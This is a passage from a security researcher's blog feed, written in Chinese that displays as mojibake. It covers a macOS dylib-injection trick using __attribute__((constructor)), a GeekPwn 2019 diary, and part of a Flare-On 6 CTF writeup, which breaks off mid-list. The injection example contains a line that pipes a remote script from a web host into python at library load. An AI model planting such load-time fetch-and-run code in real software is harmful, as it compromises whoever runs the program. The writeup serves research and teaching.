ç¨‹åºï¼Œé‚£ä¹ˆå¦å¤–ä¸€ä¸ªé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•è®©åœ¨ç¨‹åºå¯åŠ¨å‰æˆ–è€…åï¼Œæ‰§è¡Œå¤–é¢çš„ä»£ç å‘¢ï¼Ÿè¿™é‡Œå°±æ˜¯è¿™ä¸ªæ–‡ç« æƒ³æçš„ä¸€ä¸ªä¸œè¥¿ã€‚</p><blockquote><p>ä»€ä¹ˆæ˜¯ @executable_path ï¼Ÿ</p><p> executable_path æ˜¯macOSçš„é“¾æ¥è·¯å¾„çš„è§£å†³æ–¹æ¡ˆä¹‹ä¸€ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ @loader_path å’Œ @rpathï¼Œå…·ä½“ç»†èŠ‚ä¸åœ¨è¿™é‡Œè¡¨è¿°ï¼Œæ„Ÿå…´è¶£å¯ä»¥è‡ªå·±æœä¸€ä¸‹ã€‚</p></blockquote><h2 id="attribute"><a href="#attribute" class="headerlink" title="attribute"></a><strong>attribute</strong></h2><h3 id="è®¤è¯†"><a href="#è®¤è¯†" class="headerlink" title="è®¤è¯†"></a>è®¤è¯†</h3><p>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯ <strong><strong>attribute</strong></strong> ï¼Ÿ </p><p><code>__attribute__</code>æ˜¯ä¸€ä¸ªç¼–è¯‘å±æ€§ï¼Œç”¨äºå‘ç¼–è¯‘å™¨æè¿°ç‰¹æ®Šçš„æ ‡è¯†ã€é”™è¯¯æ£€æŸ¥æˆ–é«˜çº§ä¼˜åŒ–ã€‚å®ƒæ˜¯GNU Cç‰¹è‰²ä¹‹ä¸€ï¼Œç³»ç»Ÿä¸­æœ‰è®¸å¤šåœ°æ–¹ä½¿ç”¨åˆ°ã€‚ <code>__attribute__</code>å¯ä»¥è®¾ç½®å‡½æ•°å±æ€§ï¼ˆFunction Attribute ï¼‰ã€å˜é‡å±æ€§ï¼ˆVariable Attribute ï¼‰å’Œç±»å‹å±æ€§ï¼ˆType Attribute)ç­‰ã€‚</p><p>æ¥ç€å¦‚ä½•åˆ©ç”¨è¯¥ç¼–è¯‘å±æ€§è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœï¼Ÿ</p><p>è¿™é‡Œæˆ‘ä»¬è¦è®¤è¯†ä¸¤ä¸ªç¼–è¯‘å±æ€§</p><ol><li><strong>attribute</strong>((constructor))</li><li><strong>attribute</strong>((destructor))</li></ol><p>è¿™ä¸¤ä¸ªå¸¦ç€  <code>__attribute__</code> ç¼–è¯‘å±æ€§çš„æ ‡è¯†å¹¶ä¸ç›¸åŒï¼Œä¸€ä¸ªæ˜¯constructor ä¸€ä¸ªæ˜¯ destructorã€‚</p><p>ä»å­—é¢ä¸Šç†è§£ constructor æ˜¯æ„é€ å™¨çš„æ„æ€ï¼Œdestructor æ˜¯ a refuse-burning furnaceï¼ˆç„šåŒ–ç‚‰çš„æ„æ€ï¼Ÿï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„ç†è§£å…¶ä¸ºc++ å‡½æ•°é‡Œçš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°ï¼Œå…¶ç‰¹ç‚¹å°±æ˜¯åœ¨äºï¼š</p><p><strong>attribute</strong>((constructor)) ç¡®ä¿æ­¤å‡½æ•°åœ¨ åœ¨<code>main</code>å‡½æ•°è¢«è°ƒç”¨ä¹‹å‰è°ƒç”¨ï¼ŒiOSä¸­åœ¨<code>+load</code>ä¹‹å<code>main</code>ä¹‹å‰æ‰§è¡Œã€‚<br> <code>constructor</code>å’Œ<code>destructor</code>ä¼šåœ¨<code>ELF</code>æ–‡ä»¶ä¸­æ·»åŠ ä¸¤ä¸ªæ®µ-<code>.ctors</code>å’Œ<code>.dtors</code>ã€‚å½“åŠ¨æ€åº“æˆ–ç¨‹åºåœ¨åŠ è½½æ—¶ï¼Œä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨è¿™ä¸¤ä¸ªæ®µï¼Œå¦‚æœå­˜åœ¨æ‰§è¡Œå¯¹åº”çš„ä»£ç ã€‚</p><p><strong>attribute</strong>((destructor))ï¼Œç¡®ä¿æ­¤å‡½æ•°åœ¨ åœ¨<code>main</code>å‡½æ•°è¢«è°ƒç”¨ä¹‹åè°ƒã€‚</p><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>æˆ‘è¿™é‡Œå¯ä»¥æ”¾ä¸€ä¸ªï¼Œå½“æ—¶macosåé¢çš„ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="meta-string">&quot;shellme.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid,ppid;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid ==<span class="number">0</span>)&#123;</span><br><span class="line">        ppid = fork();</span><br><span class="line">        <span class="keyword">if</span> (ppid == <span class="number">0</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;touch /tmp/hacker&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;curl shellme.bestwing.me | python &gt; /dev/null &amp;&quot;</span>);</span><br><span class="line"><span class="comment">//        system(&quot;./shell&quot;);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))<span class="function"><span class="keyword">int</span> <span class="title">fuck</span><span class="params">()</span></span>&#123;</span><br><span class="line">    load();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==== Hacked by chaitin ====\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿™é‡Œå¯ä»¥é€‰æ‹©Xcode è¿›è¡Œç¼–è¯‘ï¼Œé€‰æ‹©ç¼–è¯‘æˆdylibï¼Œæˆ–è€…ç›´æ¥ gcc test.c -shared ç¼–è¯‘ä¹Ÿå¯ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123220244.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123220244.png"></a></p><p>æœ€åæ”¹æˆç›¸åº”çš„åå­—ï¼Œæ”¾åˆ°è¢«æ³¨å…¥çš„ç¨‹åºçš„å¯¹åº”ç›®å½•é‡Œå³å¯ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> attribute </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 å¹´geekpwn æ—¥è®°</title>
      <link href="2019-geekpwn-writeup.html"/>
      <url>2019-geekpwn-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="é¢˜è®°"><a href="#é¢˜è®°" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h2><p>â€‹    </p><p><em>ä½œä¸ºå›½é™…åŒ–çš„æ™ºèƒ½ç”Ÿæ´»å®‰å…¨ç¤¾åŒºï¼ŒGeekPwn æ˜¯å®‰å…¨æå®¢ä»¬æ–½å±•æ‰åå’Œåˆ†äº«ç ”ç©¶æˆæœçš„èˆå°ã€‚GeekPwn å¤§èµ›å°†åœ¨ 2019 å¹´ 10 æœˆ 24 æ—¥ä¸­å›½ä¸Šæµ·ä¸¾è¡Œï¼ŒåŠ›é‚€æ‰åæ¨ªæº¢çš„æå®¢é€‰æ‰‹æŠ¥åï¼Œçªç ´å®‰å…¨çš„è¾¹ç•Œ</em></p><p>ä»Šå¹´çš„geekpwn æœ‰ä¸¤åœºï¼Œä¸€æ˜¯7æœˆ24æ—¥åä¸ºä¸“åœºï¼Œé’ˆå¯¹åä¸ºè®¾å¤‡è¿›è¡Œçš„ç ´è§£ï¼ŒäºŒæ˜¯10æœˆ24æ—¥ä¸Šæµ·geekpwnä¸»åœºï¼Œå¯æƒœçš„æ˜¯ä»Šå¹´åªæœ‰ä¸€å¤©ã€‚æœ‰å¹¸çš„æ˜¯ï¼Œä»Šå¹´æˆ‘ä¸¤åœºéƒ½ä»¥â€œé•¿äº­ç§‘æŠ€â€å®‰å…¨ç ”ç©¶å‘˜çš„èº«ä»½å‚ä¸äº†ã€‚</p><h2 id="7æœˆ24æ—¥-åä¸ºä¸“åœº"><a href="#7æœˆ24æ—¥-åä¸ºä¸“åœº" class="headerlink" title="7æœˆ24æ—¥ åä¸ºä¸“åœº"></a>7æœˆ24æ—¥ åä¸ºä¸“åœº</h2><p>â€‹    ç”±äºæ¶‰åŠåˆ°æ¼æ´å…¬å¼€åŸåˆ™ï¼Œæ¼æ´ç»†èŠ‚åœ¨æ­¤æ–‡ä¸­æ˜¯ä¸ä¼šæåŠçš„ï¼Œæ­¤æ–‡ä¸»è¦å†™ä¸€äº›è¿™æ®µæ—¶é—´å†…ä»¥æ¥çš„ä¸€äº›æ„Ÿè§¦ï¼Œæ¼æ´æŒ–æ˜ç»éªŒä»¥åŠåœ¨é•¿äº­ç§‘æŠ€çš„ä¸€äº›æ„Ÿå—ã€‚</p><p>â€‹    6æœˆåº•çš„æ—¶å€™åˆšå¥½æˆ‘æ¯•ä¸šç­”è¾©ï¼Œé‚£ä¸ªæ—¶å€™å…¬å¸é‡Œä¹Ÿåˆšå¥½å·®ä¸å¤šç»“æŸäº†â€œæŠ¤ç½‘â€çš„æ´»åŠ¨ï¼Œé‚£æ®µæ—¶é—´ï¼Œexploreã€æ™¨å‡å¤§ä½¬åœ¨å‡†å¤‡7æœˆ24æ—¥åä¸ºä¸“åœºgeekpwnã€‚</p><p>â€‹    7æœˆåˆçš„æ—¶å€™ï¼Œm4xæ‹‰äº†ä¸€ä¸ªåä¸ºIoTçš„ç¾¤ç»„</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028215127.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028215127.png"></a></p><p>â€‹    æ­£å¼ä»¥æ™¨å‡å‰æœŸæŒ–æ˜çš„ä¸€ä¸ªæ¼æ´è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œåé¢æ™¨å‡åŸºæœ¬å°±æ²¡æ¥è¿‡å…¬å¸Orzâ€¦</p><p>â€‹    æ•´ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬ç»å†äº†å¤§èµ·å¤§è½ï¼Œæ¯æ¬¡éƒ½è§‰å¾—è¦æˆäº†ï¼Œç„¶åå°±åˆéƒ½æ²‰åº•äº†..ï¼ˆPsï¼š åä¸ºçš„äº§å“çœŸéš¾æ‰“ï¼‰â€¦æˆ‘ä»¬ä»ä¸€ä¸ªå…¥å£ï¼Œè·å–root shell èŠ±äº†å¤§æ¦‚ä¸¤ä¸ªç¤¼æ‹œçš„æ—¶é—´ã€‚ä¸­é—´åˆ©ç”¨åŒ…æ‹¬ä»»æ„å‘½ä»¤æ‰§è¡Œã€ææƒç­‰æ¼æ´å·®ä¸å¤šæœ‰å››äº”ä¸ªä¸ªå°çš„é—®é¢˜ç»„æˆäº†ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨é“¾â€¦æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„..ä»¥åŠèƒ½æ˜æ˜¾æ„Ÿå—åˆ° é•¿äº­å®‰ç ”çš„æ°›å›´ï¼ŒçœŸçš„æœ‰ä¸€ç§æ‰“â€œCTFâ€çš„é”™è§‰ 233</p><p>å½“ç„¶æœ€åå¥½åƒå®Œæˆè¿™ä¸ª geekpwnåä¸ºä¸“åœºçš„ä¸€å…±åªæœ‰ä¸‰ä¸ªé˜Ÿä¼ï¼Œå½“ç„¶åŒ…æ‹¬ â€œé•¿äº­ç§‘æŠ€â€æ˜¯å…¶ä¸­çš„ä¸€ä¸ªã€‚æ„Ÿè°¢é˜Ÿå‹ä¸€ä¸‹ä¸åˆ†é¡ºåºï¼šæ™¨å‡ã€wupcoã€exploreã€æ°å…‹é©¬ã€m4xçš„å¸¦é£</p><h2 id="10æœˆ24æ—¥-ä¸Šæµ·ä¸»åœº"><a href="#10æœˆ24æ—¥-ä¸Šæµ·ä¸»åœº" class="headerlink" title="10æœˆ24æ—¥ ä¸Šæµ·ä¸»åœº"></a>10æœˆ24æ—¥ ä¸Šæµ·ä¸»åœº</h2><p>â€‹    ä»Šå¹´çš„ä¸Šæµ·ä¸»åœºçš„åŸæœ¬æ˜¯è¦æ”¾å¼ƒäº†ï¼Œäº‹æƒ…å‘ç”Ÿåœ¨ rwctf ä¹‹åï¼Œç”±äºå‰æœŸå¤§å®¶éƒ½åœ¨å‡†å¤‡rwctfçš„é¢˜ï¼Œç„¶åæœ€åç”±äºä¸€äº›é—®é¢˜ï¼Œæˆ‘çš„é¢˜ç›®â€œå’•äº†â€ã€‚åœ¨æ­¤ä¸­é—´ç»å†äº† å¤§åæ‘„åƒå¤´ã€å°ç±³å®å®é—¨é“ƒç­‰ç­‰è®¾å¤‡ï¼Œç”±äºrwctfçš„å‡†å¤‡æˆ–è€…Pwnä¸‹æ¥å®åœ¨æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰å°±ä¸­é€”å¤­æŠ˜äº†ï¼ˆPsï¼šå…¶å®æˆ‘ä»¬åœ¨å¯»æ±‚ä¸€äº›ä¸å†æ˜¯ ä»€ä¹ˆè·¯ç”±å™¨ã€æ‘„åƒå¤´çš„IoTè®¾å¤‡ï¼‰ã€‚</p><p>â€‹    </p><p>â€‹    ç„¶åå°±åœ¨9æœˆ12æ—¥çš„æ—¶å€™ï¼Œæ¨åšæäº†ä¸€å¥ï¼Œè¦ä¸å°±å®ƒäº†ï¼ˆæ­¤å¤„è™½ç„¶å¤§å®¶éƒ½çŸ¥é“ï¼Œä½†è¿˜æ˜¯éšåå§ï¼Œæˆ‘æ€•è¢«è¯¥å…¬å¸æ‰“ï¼Œä¸‹æ–‡å‡ä»¥å®ƒæŒ‡ä»£æ­¤è®¾å¤‡ï¼‰ï¼Œè¿˜å¯ä»¥åšæ„ŸæŸ“å…¶ä»–è®¾å¤‡ã€‚</p><p>â€‹    äºæ˜¯æˆ‘ä»¬ä¸€å¼€å§‹èŠ±äº†1-2ä¸ªç¤¼æ‹œï¼Œé™†é™†ç»­ç»­æŒ–æ˜äº†å…­ä¸ƒä¸ªé—®é¢˜ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¯¥è®¾å¤‡çŠ¯äº†ä¸€äº›å¸¸è§IoTè®¾å¤‡éƒ½ä¼šçŠ¯çš„é—®é¢˜ï¼ˆæ¯”å¦‚ï¼šä½ è‡ªå·±æƒ³å§ ä½ èƒ½æƒ³åˆ°çš„åŸºæœ¬éƒ½æœ‰ï¼Œä»ç¡¬ä»¶åˆ°è½¯ä»¶ï¼‰ã€‚ç„¶åä¸­é€”ï¼Œç”±äºå…¬å¸éœ€æ±‚ï¼Œæˆ‘å’Œm4xå»äº†å—äº¬è¿›è¡Œæ‹¿å¤´ä»£ç å®¡è®¡ä¸šåŠ¡ã€‚æ°å…‹é©¬åˆšå¥½åé¢å›äº†å…¬å¸ï¼Œæ‰€ä»¥åé¢çš„æ”»å‡»åŸºæœ¬æ˜¯æ°å…‹é©¬å’Œexploreå®Œæˆçš„ã€‚</p><p>â€‹    æœ€åï¼Œä¸ºäº†å®Œæˆä¸€ä¸ªgeekpwnçš„showçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬åˆå‡†å¤‡äº†å¹³æ¿ç”µè§†çš„æ”»å‡»ï¼Œè¿™ä¸ªä¹Ÿå€¼å¾—è°ƒä¾ƒçš„æ˜¯ï¼Œä¸€å¼€å§‹åªæ˜¯ä¸€ä¸ªæ— æ³•ç›´æ¥ä»»æ„å‘½ä»¤æ‰§è¡Œçš„å®‰å…¨é—®é¢˜ï¼Œæœ€ååˆ©ç”¨äº†å„ç§å®‰å“çš„featureå®Œæˆäº†å‘½ä»¤æ‰§è¡Œï¼Œç„¶è€Œçš„æ˜¯ï¼Œç”±äºæˆ‘ä»¬ä¸€å¼€å§‹æµ‹è¯•æ²¡æœ‰å‡çº§åˆ°æœ€æ–°çš„ç‰ˆæœ¬ï¼Œæœ€åå‡çº§çš„æ—¶å€™ï¼Œè¿™ä¸ªæ´è¢«ä¿®å¤äº†ï¼Œä½†å¯å–œçš„æ˜¯ï¼Œå‡çº§åé€äº†æˆ‘ä»¬ä¸€ä¸ªèƒ½å‘½ä»¤æ‰§è¡Œçš„æ¼æ´..233ã€‚</p><p>â€‹    </p><p><strong>ä¸­é—´çš„ä¸€äº›å°æ’æ›²</strong></p><p>1ã€å­¦ä¹ äº†ä¸€äº› macos ä¸‹çš„dllæ³¨å…¥</p><p>â€‹    åˆ©ç”¨ insert_dylib è¿›è¡Œmacos ä¸‹çš„dylib æ³¨å…¥</p><p>2ã€å­¦ä¹ äº†ä¸€äº›windows ä¸‹defender çš„ä¸€äº›ç»•è¿‡çš„ç®€å•æ€è·¯</p><p>â€‹    å¯¹ shellcode å¤šæ¬¡åŠ å¯† ç»•è¿‡defender é™æ€æ–‡ä»¶æ‰«æ</p><h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>è¿˜æœ‰ä¸€äº›æ•…äº‹æœ‰æ—¶é—´å†åˆ†äº«ï¼Œå…ˆè´´ä¸€å¼ æœ€åçš„å¤§åˆå½±ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028220803.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028220803.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> geekpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The flare-on challenge 6th writeup</title>
      <link href="flare-on-6th-writeup.html"/>
      <url>flare-on-6th-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>è¿™æ˜¯ç¬¬ä¸‰æ¬¡å‚åŠ flare onäº† è¿™æ¬¡ä¹Ÿæ˜¯ç¬¬äºŒæ¬¡åšå®Œå…¨éƒ¨çš„é¢˜ã€‚</p><h2 id="1-Memecat-Battlestation"><a href="#1-Memecat-Battlestation" class="headerlink" title="1 - Memecat Battlestation"></a>1 - Memecat Battlestation</h2><p>C# é¢˜ç›®ï¼Œä¸€å…±ä¸¤å…³</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104418.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104418.png"></a></p><p>stage1Form.WeaponCode ä¸ºæ˜æ–‡ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104735.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104735.png"></a></p><p>Stage2Form.WeaponCode ä¸ºå¼‚æˆ–ç»“æœï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104819.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104819.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array = [<span class="number">0x3</span>,ord(<span class="string">&#x27; &#x27;</span>),ord(<span class="string">&#x27;&amp;&#x27;</span>),ord(<span class="string">&#x27;$&#x27;</span>),ord(<span class="string">&#x27;-&#x27;</span>),<span class="number">0x1e</span>,<span class="number">0x2</span>,ord(<span class="string">&#x27; &#x27;</span>),ord(<span class="string">&#x27;/&#x27;</span>),ord(<span class="string">&#x27;/&#x27;</span>),ord(<span class="string">&#x27;.&#x27;</span>),ord(<span class="string">&#x27;/&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">s2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(array)):</span><br><span class="line">    s2 += chr(array[i]^ord(<span class="string">&#x27;A&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="2-overlong"><a href="#2-overlong" class="headerlink" title="2 - overlong"></a>2 - overlong</h2><p>ä¸€ä¸ªpatch é¢˜ç›®ï¼Œé¢˜ç›®é»˜è®¤è¾“å‡ºä¸ª</p><p>â€œI never stop the encodingâ€ </p><p>åœ¨æ ˆä¸Šå°†é•¿åº¦æ”¹å¤§ï¼Œç„¶åå°±get flag</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819113031.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819113031.png"></a></p><h2 id="3-flarebear"><a href="#3-flarebear" class="headerlink" title="3 - flarebear"></a>3 - flarebear</h2><p>apk é¢˜ ä½¿ç”¨jebé€†å‘å‘ç°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130436.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130436.png"></a></p><p>å½“æ»¡è¶³ ishappy() å’Œ isEcstatic() ä¸¤ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œä¼šæ‰“å°flagã€‚</p><p>ishappy() é€»è¾‘å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131155.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131155.png"></a></p><p>isEcstatic() é€»è¾‘å¦‚ä¸‹ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130705.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130705.png"></a></p><p>æ¸¸æˆæœ‰ä¸‰ä¸ªåŠŸèƒ½åˆ†åˆ«ä¸º feed play clean:</p><p>ä¸‰ä¸ªåŠŸèƒ½åˆ†åˆ«å¦‚ä¸‹ï¼š</p><p><strong>feed</strong>ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130859.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130859.png"></a></p><p><strong>play</strong>ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131126.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131126.png"></a></p><p><strong>clean</strong>:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131025.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131025.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">feed = Int(<span class="string">&#x27;feed&#x27;</span>)</span><br><span class="line">play = Int(<span class="string">&#x27;play&#x27;</span>)</span><br><span class="line">clean = Int(<span class="string">&#x27;clean&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solve(feed/play &gt;= <span class="number">2</span>, feed/play&lt;=<span class="number">2.5</span>,feed*<span class="number">10</span>-play*<span class="number">2</span> == <span class="number">72</span>,feed*<span class="number">2</span> + play*<span class="number">4</span> - clean == <span class="number">30</span>,-feed -play + clean*<span class="number">6</span>==<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:/media/psf/Home/Desktop/flare-on/3 - Flarebear $ python solve.py </span><br><span class="line">[Clean = 2, feed = 8, play = 4]</span><br></pre></td></tr></table></figure><p>æœ€åå¯æ‰“å°å‡ºflagï¼š</p><h2 id="4-Dnschess"><a href="#4-Dnschess" class="headerlink" title="4 - Dnschess"></a>4 - Dnschess</h2><p>é¢˜ç›®äº†ä¸‰ä¸ªé™„ä»¶ï¼Œä¸€ä¸ªpcapæµé‡åŒ… ä¸€ä¸ªChessUI å’ŒChessAI.so æ–‡ä»¶ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819143100.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819143100.png"></a></p><p>é€šè¿‡DNSåè®®ä¸‹æ£‹</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163246.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163246.png"></a></p><p>é¦–å…ˆå°†æ»¡è¶³æ¡ä»¶çš„ipæå–å‡ºæ¥ï¼š    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">iplist = []</span><br><span class="line">cap = FileCapture(input_file=<span class="string">&#x27;capture.pcap&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i,p <span class="keyword">in</span> enumerate(cap):</span><br><span class="line">    <span class="comment"># if p.dns.flags == &#x27;0x00000120&#x27;:</span></span><br><span class="line">    <span class="keyword">if</span> p.dns.flags == <span class="string">&#x27;0x00008580&#x27;</span>:</span><br><span class="line">        name = p.dns.qry_name</span><br><span class="line">        ip = p.dns.a.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(ip)</span></span><br><span class="line">        <span class="keyword">if</span> ip[<span class="number">0</span>] != <span class="number">127</span> <span class="keyword">or</span> ip[<span class="number">3</span>]&amp;<span class="number">1</span> <span class="keyword">and</span> (i/<span class="number">2</span>)&amp;(ip[<span class="number">2</span>])&amp;<span class="number">0xf</span>:</span><br><span class="line">            <span class="comment"># print (map(chr,t2))</span></span><br><span class="line">            ip = <span class="string">&quot;.&quot;</span>.join(ip)</span><br><span class="line">            iplist.append(str(ip))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">print(iplist)</span><br><span class="line">print(len(iplist))</span><br></pre></td></tr></table></figure><p>iplistï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;127.150.96.223&#x27;</span>, <span class="string">&#x27;127.252.212.90&#x27;</span>, <span class="string">&#x27;127.215.177.38&#x27;</span>, <span class="string">&#x27;127.118.118.207&#x27;</span>, <span class="string">&#x27;127.89.38.84&#x27;</span>, <span class="string">&#x27;127.109.155.97&#x27;</span>, <span class="string">&#x27;127.217.37.102&#x27;</span>, <span class="string">&#x27;127.49.59.14&#x27;</span>, <span class="string">&#x27;127.182.147.24&#x27;</span>, <span class="string">&#x27;127.0.143.11&#x27;</span>, <span class="string">&#x27;127.227.42.139&#x27;</span>, <span class="string">&#x27;127.101.64.243&#x27;</span>, <span class="string">&#x27;127.201.85.103&#x27;</span>, <span class="string">&#x27;127.200.76.108&#x27;</span>, <span class="string">&#x27;127.50.67.23&#x27;</span>, <span class="string">&#x27;127.157.96.119&#x27;</span>, <span class="string">&#x27;127.99.253.122&#x27;</span>, <span class="string">&#x27;127.25.74.92&#x27;</span>, <span class="string">&#x27;127.168.171.31&#x27;</span>, <span 